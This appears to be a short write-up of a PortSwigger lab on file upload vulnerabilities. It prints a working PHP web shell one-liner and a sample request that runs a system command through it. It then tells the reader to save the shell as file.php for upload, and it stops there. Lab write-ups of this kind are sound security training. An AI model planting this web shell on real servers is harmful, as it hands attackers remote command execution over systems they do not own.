## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/95a1da63-a8a2-48cd-8887-d1f17a2a1591)

## Overview :

- If we're able to successfully upload a web shell, we effectively have full control over the server.
- For example, the following PHP one-liner could be used to run commands on the server:  `<?php echo system($_GET['command']); ?>`

Once uploaded , we can pass an arbitrary system command via a query parameter as follows:

```
GET /example/exploit.php?command=id HTTP/1.1
```

## Solution :

Click on any of the blog posts. We can see that we have an option to upload files.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/907e5013-4590-426e-881f-71a47a4f85de)


Create a file name `file.php` with the contents - `<?php echo system($_GET['command']); ?>`
